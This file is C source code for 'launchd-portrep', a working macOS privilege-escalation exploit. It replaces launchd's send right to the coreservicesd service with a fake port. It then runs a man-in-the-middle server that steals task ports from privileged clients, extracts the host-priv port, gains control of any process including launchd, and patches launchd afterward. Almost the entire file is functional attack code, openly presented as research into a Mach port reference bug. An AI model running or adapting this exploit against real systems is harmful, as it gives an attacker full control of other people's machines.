/*
 * launchd-portrep
 * Brandon Azad
 *
 *
 * launchd-portrep
 * ================================================================================================
 *
 *
 * Exploit strategy to get host-priv
 * ------------------------------------------------------------------------------------------------
 *
 *  This bug is a less general version of CVE-2016-7637, a Mach port user reference handling issue
 *  in XNU discovered by Ian Beer that allowed processes to free Mach ports in other processes [1].
 *  Ian Beer exploited that vulnerability on macOS by replacing launchd's send right to the
 *  com.apple.CoreServices.coreservicesd endpoint and impersonating coreservicesd to the rest of
 *  the system. Coreservicesd is an attractive target because it is one of a few services to which
 *  clients will send their task port in a Mach message. By replacing launchd's send right to
 *  coreservicesd with his own port and then triggering privileged clients to look up and
 *  communicate with coreservicesd, he was able to obtain the task port for a privileged process
 *  and then execute code within that process.
 *
 *  [1]: https://bugs.chromium.org/p/project-zero/issues/detail?id=959
 *
 *  Since the behavior on macOS hasn't changed, I basically copied Ian Beer's exploit strategy for
 *  this vulnerability. We send exception messages to launchd containing coreservicesd's service
 *  port until we free launchd's send right to that port. We can detect when we've freed the right
 *  by calling bootstrap_look_up() again on the service: if launchd returns an invalid port name,
 *  then we've successfully freed launchd's send right to the port. Then, we repeatedly register
 *  and unregister a large number of services with launchd until one of the services we register is
 *  assigned the same Mach port name in launchd's IPC space as the original coreservicesd port. At
 *  this point, any process that looks up com.apple.CoreServices.coreservicesd in launchd will
 *  receive a send right to our fake service rather than the real coreservicesd. We then run a MITM
 *  server on the fake service port, inspecting all Mach ports in the messages received from
 *  clients before sending them along to the real coreservicesd. Eventually a privileged client
 *  will connect and send us its task port, allowing us to extract the host-priv port. Once we have
 *  the host-priv port, we can get the task port for any task on the system.
 *
 *  In order to (mostly) restore proper functioning of the system, we use the host-priv port to
 *  obtain launchd's task port, and then use launchd's task port to replace launchd's send right to
 *  our fake service port back with a send right to the real coreservicesd. That way future clients
 *  can actually reach coreservicesd.
 *
 *  One problem I've noticed with this approach is that the system seems to hang on shutdown for a
 *  short while. I'm assuming that this is because tampering with launchd's ports messes up some of
 *  launchd's accounting or port notifications. I haven't investigated this issue further, but
 *  restarting coreservicesd using launchctl seems to fix it:
 *
 *  	$ sudo launchctl kickstart -k -p system/com.apple.coreservicesd
 *
 */
#include "launchd-portrep-hostpriv.h"

#include "launchd-portrep.h"
#include "log.h"

#include <assert.h>
#include <bootstrap.h>
#include <dispatch/dispatch.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>

// ---- Convenience functions ---------------------------------------------------------------------

// Receive a mach message on a port and pass it to the specified handler block.
static bool
mach_receive_message(mach_port_t port, void (^handler)(mach_msg_header_t *msg)) {
	kern_return_t kr;
	// Loop until we get the buffer size right.
	mach_msg_header_t *msg;
	size_t msg_size = 0x1000;
	mach_msg_options_t options = MACH_RCV_MSG | MACH_RCV_LARGE
		| MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
		| MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
	for (;;) {
		// Allocate a buffer for the message.
		msg = malloc(msg_size);
		assert(msg != NULL);
		// Try to receive the message.
		kr = mach_msg(msg,
				options,
				0,
				msg_size,
				port,
				MACH_MSG_TIMEOUT_NONE,
				MACH_PORT_NULL);
		if (kr != MACH_RCV_TOO_LARGE) {
			break;
		}
		// Allocate a bigger message buffer next time. This should only happen once, if the
		// kernel doesn't like to us.
		free(msg);
		msg_size = msg->msgh_size + REQUESTED_TRAILER_SIZE(options);
	}
	// Handle any errors.
	if (kr != KERN_SUCCESS) {
		goto done;
	}
	// Process the message.
	handler(msg);
done:
	free(msg);
	return (kr == KERN_SUCCESS);
}

// Send a Mach message.
static bool
mach_send_message(mach_msg_header_t *msg) {
	kern_return_t kr = mach_msg(msg,
			MACH_SEND_MSG,
			msg->msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "mach_msg", kr);
	}
	return (kr == KERN_SUCCESS);
}

// ---- Mach MITM server --------------------------------------------------------------------------

// Translate a right type sent in a Mach message so that the port is sent along to the destination.
static mach_msg_type_name_t
mach_mitm_forward_right_type(mach_msg_type_name_t right_type) {
	switch (right_type) {
		case MACH_MSG_TYPE_PORT_RECEIVE:   return MACH_MSG_TYPE_MOVE_RECEIVE;
		case MACH_MSG_TYPE_PORT_SEND:      return MACH_MSG_TYPE_MOVE_SEND;
		case MACH_MSG_TYPE_PORT_SEND_ONCE: return MACH_MSG_TYPE_MOVE_SEND_ONCE;
		default:                           return 0;
	}
}

// Translate a descriptor sent in a Mach message so that all resources are sent along to the
// destination.
static mach_msg_type_descriptor_t *
mach_mitm_forward_descriptor(mach_msg_type_descriptor_t *descriptor) {
	mach_msg_descriptor_t *d = (mach_msg_descriptor_t *)descriptor;
	void *next = descriptor + 1;
	switch (d->type.type) {
		case MACH_MSG_PORT_DESCRIPTOR:
			d->port.disposition = mach_mitm_forward_right_type(d->port.disposition);
			next = &d->port + 1;
			break;
		case MACH_MSG_OOL_DESCRIPTOR:
		case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
			d->out_of_line.deallocate = 1;
			next = &d->out_of_line + 1;
			break;
		case MACH_MSG_OOL_PORTS_DESCRIPTOR:
			d->ool_ports.deallocate = 1;
			d->ool_ports.disposition = mach_mitm_forward_right_type(d->ool_ports.disposition);
			next = &d->ool_ports + 1;
			break;
	}
	return next;
}

// Process an inbound message on our fake service port so that it can be sent over to the real
// service port.
static void
mach_mitm_modify_for_forwarding(mach_msg_header_t *msg, mach_port_t real_service) {
	// Modify the message so that the service will reply directly to the client. We can't
	// actually fool the service into thinking that we have the UID/PID/etc. of the true client
	// because the audit token (set by the kernel) will tell them who we are, but we will fool
	// the client into thinking they're talking with the true service.
	mach_msg_type_name_t client_remote_right  = MACH_MSGH_BITS_REMOTE(msg->msgh_bits);
	mach_msg_type_name_t client_voucher_right = MACH_MSGH_BITS_VOUCHER(msg->msgh_bits);
	mach_msg_bits_t      other_bits           = MACH_MSGH_BITS_OTHER(msg->msgh_bits);
	bool                 is_complex           = MACH_MSGH_BITS_IS_COMPLEX(msg->msgh_bits);
	mach_port_t          client_port          = msg->msgh_remote_port;
	mach_msg_type_name_t new_remote_right     = MACH_MSG_TYPE_COPY_SEND;
	mach_msg_type_name_t new_local_right      = mach_mitm_forward_right_type(client_remote_right);
	mach_msg_type_name_t new_voucher_right    = mach_mitm_forward_right_type(client_voucher_right);
	msg->msgh_bits        = MACH_MSGH_BITS_SET(new_remote_right, new_local_right, new_voucher_right, other_bits);
	msg->msgh_remote_port = real_service;
	msg->msgh_local_port  = client_port;
	if (is_complex) {
		mach_msg_body_t *body = (mach_msg_body_t *)(msg + 1);
		mach_msg_type_descriptor_t *descriptor = (mach_msg_type_descriptor_t *)(body + 1);
		for (size_t i = 0; i < body->msgh_descriptor_count; i++) {
			descriptor = mach_mitm_forward_descriptor(descriptor);
		}
	}
}

// Create a MIG error response for the given message. The reply struct should be zeroed beforehand.
static void
mach_mig_create_error(mach_msg_header_t *request, mig_reply_error_t *reply, kern_return_t kr) {
	reply->Head.msgh_bits        = MACH_MSGH_BITS_SET_PORTS(MACH_MSGH_BITS_REMOTE(request->msgh_bits), 0, 0);
	reply->Head.msgh_size        = sizeof(*reply);
	reply->Head.msgh_remote_port = request->msgh_remote_port;
	reply->Head.msgh_id          = request->msgh_id + 100;
	reply->NDR                   = NDR_record;
	reply->RetCode               = kr;
}

// The type of a Mach message handler function.
typedef bool (^mach_mitm_server_message_handler_t)(mach_msg_header_t *msg);

// Run the MITM server to process a single message.
static bool
mach_mitm_server_once(mach_port_t real_service, mach_port_t fake_service,
		mach_mitm_server_message_handler_t handle_message) {
	return mach_receive_message(fake_service, ^(mach_msg_header_t *msg) {
		// Create a reply struct in case sending doesn't work.
		mig_reply_error_t error_reply = {};
		mach_mig_create_error(msg, &error_reply, KERN_FAILURE);
		// Pass the message to the handler function. This function will indicate whether
		// we should forward the message or abort the connection.
		bool forward = handle_message(msg);
		// If we should forward the message, try to do so.
		bool sent = false;
		if (forward) {
			DEBUG_TRACE(2, "Forwarding message %x", msg->msgh_id);
			mach_mitm_modify_for_forwarding(msg, real_service);
			sent = mach_send_message(msg);
		}
		// If we haven't sent the message (either because the message handler told us not
		// to or because the send to failed), send an error reply to the client.
		if (!sent) {
			mach_send_message(&error_reply.Head);
			// Note that the error reply message consumes the remote port in the
			// original message, so we don't want to free that again.
			msg->msgh_remote_port = MACH_PORT_NULL;
			mach_msg_destroy(msg);
		}
	});
}

// Run the MITM server in a loop until we encounter an error.
static void
mach_mitm_server(mach_port_t real_service, mach_port_t fake_service,
		mach_mitm_server_message_handler_t handle_message) {
	bool ok;
	do {
		ok = mach_mitm_server_once(real_service, fake_service, handle_message);
	} while (ok);
}

// ---- Mach message inspection -------------------------------------------------------------------

// Inspect all the Mach ports in a Mach message descriptor.
static mach_msg_type_descriptor_t *
mach_descriptor_inspect_ports(mach_msg_type_descriptor_t *descriptor,
		void (^inspect_port)(mach_port_t)) {
	mach_msg_descriptor_t *d = (mach_msg_descriptor_t *)descriptor;
	mach_port_t port;
	void *next = descriptor + 1;
	switch (d->type.type) {
		case MACH_MSG_PORT_DESCRIPTOR:
			port = d->port.name;
			if (MACH_PORT_VALID(port)) {
				inspect_port(port);
			}
			next = &d->port + 1;
			break;
		case MACH_MSG_OOL_DESCRIPTOR:
		case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
			next = &d->out_of_line + 1;
			break;
		case MACH_MSG_OOL_PORTS_DESCRIPTOR:
			next = &d->ool_ports + 1;
			mach_port_t *ports = (mach_port_t *)d->ool_ports.address;
			mach_port_t *end = ports + d->ool_ports.count;
			for (; ports < end; ports++) {
				port = *ports;
				if (MACH_PORT_VALID(port)) {
					inspect_port(port);
				}
			}
			break;
	}
	return next;
}

// Inspect all the Mach ports in a Mach message (except for msgh_local_port).
static void
mach_message_inspect_ports(mach_msg_header_t *msg, void (^inspect_port)(mach_port_t)) {
	if (MACH_PORT_VALID(msg->msgh_remote_port)) {
		inspect_port(msg->msgh_remote_port);
	}
	if (MACH_MSGH_BITS_IS_COMPLEX(msg->msgh_bits)) {
		mach_msg_body_t *body = (mach_msg_body_t *)(msg + 1);
		mach_msg_type_descriptor_t *descriptor = (mach_msg_type_descriptor_t *)(body + 1);
		for (size_t i = 0; i < body->msgh_descriptor_count; i++) {
			descriptor = mach_descriptor_inspect_ports(descriptor, inspect_port);
		}
	}
}

// ---- Task manipulation -------------------------------------------------------------------------

mach_port_t
host_priv_task_for_pid(mach_port_t host_priv, int pid) {
	mach_port_t task = MACH_PORT_NULL;
	// Get the processor set port.
	mach_port_t pset;
	kern_return_t kr = processor_set_default(host_priv, &pset);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "processor_set_default", kr);
		goto fail_0;
	}
	// Get the processor set control port.
	mach_port_t pset_priv;
	kr = host_processor_set_priv(host_priv, pset, &pset_priv);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "host_processor_set_priv", kr);
		goto fail_1;
	}
	// Get all the tasks on this processor set.
	task_array_t tasks;
	mach_msg_type_number_t task_count;
	kr = processor_set_tasks(pset_priv, &tasks, &task_count);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "processor_set_tasks", kr);
		goto fail_2;
	}
	// Now try to find our task. Deallocate all the other ones we don't want along the way.
	for (size_t i = 0; i < task_count; i++) {
		int task_pid = -1;
		pid_for_task(tasks[i], &task_pid);
		if (task_pid == pid) {
			task = tasks[i];
		} else {
			mach_port_deallocate(mach_task_self(), tasks[i]);
		}
	}
	// Clean up.
	mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) tasks,
			task_count * sizeof(*tasks));
fail_2:
	mach_port_deallocate(mach_task_self(), pset_priv);
fail_1:
	mach_port_deallocate(mach_task_self(), pset);
fail_0:
	return task;
}

// Get the port name for a Mach port, which must be a send right, held in a task. This routine is a
// hack: There's no API to do this directly, so we gather the list of Mach port names in the task
// and test every one individually to see if it's a match.
static kern_return_t
task_get_send_right_name(task_t task, mach_port_t port, mach_port_name_t *port_name) {
	// First get all the names.
	mach_port_name_array_t names;
	mach_msg_type_number_t name_count;
	mach_port_type_array_t types;
	mach_msg_type_number_t type_count;
	kern_return_t kr = mach_port_names(task, &names, &name_count, &types, &type_count);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "mach_port_names", kr);
		goto fail_0;
	}
	// Next try to insert the local port into the task's IPC namespace under every possible
	// port name. We do it this way rather than extracting to avoid an extra dealloc every time
	// we miss, even though that also means we may mistakenly insert the port into the task's
	// IPC namespace if it wasn't already there. (We know it'll be there for this exploit.)
	// mach_port_insert_right may return:
	//   KERN_SUCCESS:      Either the port didn't already exist in the task and the original
	//                      port with this name was freed since we called mach_port_names, or
	//                      we have found the correct port name. In either case, the name now
	//                      refers to the port.
	//   KERN_NAME_EXISTS:  The name exists in the task and it's not the target port. Keep
	//                      searching.
	//   KERN_RIGHT_EXISTS: The name does not exist in the task, but port has a different name
	//                      in the task. Keep searching.
	for (size_t i = 0; i < name_count; i++) {
		// Skip it if it isn't a pure send right.
		if ((types[i] & MACH_PORT_TYPE_ALL_RIGHTS) != MACH_PORT_TYPE_SEND) {
			continue;
		}
		// Try to insert it.
		kern_return_t kr2 = mach_port_insert_right(task, names[i], port,
				MACH_MSG_TYPE_COPY_SEND);
		switch (kr2) {
			case KERN_SUCCESS:
				*port_name = names[i];
				goto port_inserted;
			case KERN_NAME_EXISTS:
			case KERN_RIGHT_EXISTS:
				break;
			default:
				kr = kr2;
				ERROR("%s: %x", "mach_port_insert_right", kr);
				goto fail_1;
		}
	}
	// The right doesn't seem to exist in the task.
	ERROR("Not found");
	kr = KERN_INVALID_VALUE;
	goto fail_1;
port_inserted:
fail_1:
	mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) names,
			name_count * sizeof(*names));
	mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) types,
			type_count * sizeof(*types));
fail_0:
	return kr;
}

// Replace a Mach send right in a task with a different send right.
static kern_return_t
task_replace_send_right(task_t task, mach_port_name_t port_name, mach_port_t new_port) {
	// First deallocate the port name in the task.
	kern_return_t kr = mach_port_destroy(task, port_name);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "mach_port_destroy", kr);
		goto fail_0;
	}
	// Now insert the new port into the task under the original name.
	kr = mach_port_insert_right(task, port_name, new_port, MACH_MSG_TYPE_COPY_SEND);
	if (kr != KERN_SUCCESS) {
		// Whoops. Sorry. Can't really fix it.
		ERROR("%s: %x", "mach_port_insert_right", kr);
	}
fail_0:
	return kr;
}

// ---- Exploit logic to obtain the host-priv port ------------------------------------------------

// Try to get the host-priv port from an intercepted Mach port.
static bool
extract_host_priv(mach_port_t port, mach_port_t host_self, mach_port_t *host_priv) {
	// First check if this is a task port.
	int pid = -1;
	pid_for_task(port, &pid);
	if (pid <= 0) {
		return false;
	}
	// Print debugging information about the process.
	INFO("Got task port %x for process %u", port, pid);
	// If we already have a host-priv, no need to try and get another.
	if (*host_priv != MACH_PORT_NULL) {
		return false;
	}
	// See if this task has a host-priv port.
	host_t task_host = MACH_PORT_NULL;
	task_get_special_port(port, TASK_HOST_PORT, &task_host);
	if (task_host != MACH_PORT_NULL && task_host != host_self) {
		kernel_boot_info_t boot_info;
		kern_return_t kr = host_get_boot_info(task_host, boot_info);
		if (kr == KERN_SUCCESS) {
			INFO("Got host priv port %x!", task_host);
			*host_priv = task_host;
			return true;
		}
	}
	// If we get here, then this wasn't a host-priv port.
	WARNING("Process %u did not have host-priv port", pid);
	mach_port_deallocate(mach_task_self(), task_host);
	return false;
}

// Fix the mess we've made in launchd. Since we freed the original service, we'll want to restore
// the original port name to refer back to the real service. I'm not sure if the exploit also
// disrupted the port notifications or any other state, but we won't worry about that.
static bool
fix_launchd(mach_port_t real_service, mach_port_t fake_service, mach_port_t host_priv) {
	bool success = false;
	// Get launchd's task port.
	mach_port_t launchd_task = host_priv_task_for_pid(host_priv, 1);
	if (launchd_task == MACH_PORT_NULL) {
		ERROR("Could not get launchd's task port");
		goto fail_0;
	}
	// Get the name of the service port in launchd's IPC space.
	mach_port_name_t service_port_name;
	kern_return_t kr = task_get_send_right_name(launchd_task, fake_service,
			&service_port_name);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not find the Mach port name of the service port we freed in launchd");
		goto fail_1;
	}
	// Now replace the fake service back with the real service.
	kr = task_replace_send_right(launchd_task, service_port_name, real_service);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not restore original service Mach port in launchd");
		goto fail_1;
	}
	// Add a reference because launchd services tend to have 2 urefs.
	kr = mach_port_mod_refs(launchd_task, service_port_name, MACH_PORT_RIGHT_SEND, 1);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not add a ref to the restored Mach service");
	}
	success = true;
fail_1:
	mach_port_deallocate(mach_task_self(), launchd_task);
fail_0:
	return success;
}

// Try to start the specified service.
bool
launchd_start_service(const char *service_name, bool wait) {
	mach_port_t service_port = MACH_PORT_NULL;
	bootstrap_look_up(bootstrap_port, service_name, &service_port);
	if (!MACH_PORT_VALID(service_port)) {
		return false;
	}
	union {
		mach_msg_header_t msg;
		struct {
			mig_reply_error_t mig;
			mach_msg_trailer_t trailer;
		} reply;
	} u = {};
	u.msg.msgh_bits        = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, 0, 0);
	u.msg.msgh_size        = sizeof(u.msg);
	u.msg.msgh_remote_port = service_port;
	u.msg.msgh_id          = 0x11223344;
	mach_msg_options_t options = MACH_SEND_MSG;
	size_t reply_size = 0;
	mach_msg_timeout_t timeout = 0;
	if (wait) {
		u.msg.msgh_bits |= MACH_MSGH_BITS_SET_PORTS(0, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0);
		options |= MACH_RCV_MSG | MACH_RCV_TIMEOUT;
		u.msg.msgh_local_port = mig_get_reply_port();
		reply_size = sizeof(u.reply);
		timeout = 20000; // 20 seconds
	}
	kern_return_t kr = mach_msg(&u.msg,
			options,
			u.msg.msgh_size,
			reply_size,
			u.msg.msgh_local_port,
			timeout,
			MACH_PORT_NULL);
	mach_port_deallocate(mach_task_self(), service_port);
	return (kr == KERN_SUCCESS);
}

// Get the host-priv port using the launchd-portrep exploit.
mach_port_t
launchd_portrep_host_priv() {
	const char *TARGET_SERVICE_NAME = "com.apple.CoreServices.coreservicesd";
	// Replace launchd's send right to the coreservicesd service with a fake service port.
	mach_port_t real_service, fake_service;
	bool ok = launchd_replace_service_port(TARGET_SERVICE_NAME,
			&real_service, &fake_service);
	if (!ok) {
		return MACH_PORT_NULL;
	}
	// Asynchronously look up some privileged services that will hopefully communicate with
	// coreservicesd. We'll try to steal a task port from one of them.
	dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 100 * NSEC_PER_MSEC),
			dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		launchd_start_service("com.apple.avbdeviced", false);
		launchd_start_service("com.apple.netauth.sys.gui", false);
	});
	// Now run a MITM server on the fake service port, on which we will receive connections
	// from clients attempting to reach the real service. Allow messages through unless they
	// seem likely to cause a crash later.
	// NOTE: This isn't robust: apps still crash. This whole process could be improved a little
	// by only targeting processes with UID 0.
	mach_port_t host_self = mach_host_self();
	__block mach_port_t host_priv = MACH_PORT_NULL;
	mach_mitm_server(real_service, fake_service, ^bool (mach_msg_header_t *msg) {
		// Print the contents of the message.
#if DEBUG_LEVEL(3)
		printf("\nNew message:\n");
		size_t print_size = msg->msgh_size + sizeof(mach_msg_trailer_t);
		size_t print_end = print_size / sizeof(uint32_t);
		for (size_t i = 0; i < print_end; i++) {
			int is_eol = (i % 4 == 3 || i == print_end - 1);
			printf("%08x%c", ((uint32_t *) msg)[i], (is_eol ? '\n' : ' '));
		}
#endif
		// First inspect the message for ports.
		__block bool just_got_host_priv = false;
		mach_message_inspect_ports(msg, ^(mach_port_t port) {
			just_got_host_priv = extract_host_priv(port, host_self, &host_priv);
		});
		// If we just got the host-priv port, fix up launchd and then destroy the fake
		// service port. Destroying the listener will prevent us from getting new
		// connections and break us out of the MITM server loop.
		if (just_got_host_priv) {
			fix_launchd(real_service, fake_service, host_priv);
			mach_port_destroy(mach_task_self(), fake_service);
		}
		// Now reject messages with id 0x2715 (the one with the task port) and 0x2720
		// (which seems to be related to apps crashing). Also reject all messages once we
		// get host-priv.
		return (host_priv == MACH_PORT_NULL
				&& msg->msgh_id != 0x2715
				&& msg->msgh_id != 0x2720);
	});
	// Clean up ports we no longer need.
	mach_port_deallocate(mach_task_self(), host_self);
	mach_port_deallocate(mach_task_self(), real_service);
	// We did it! We've (hopefully) fixed up launchd and now have the host-priv port!
	INFO("We did it :) Yay!");
	return host_priv;
}
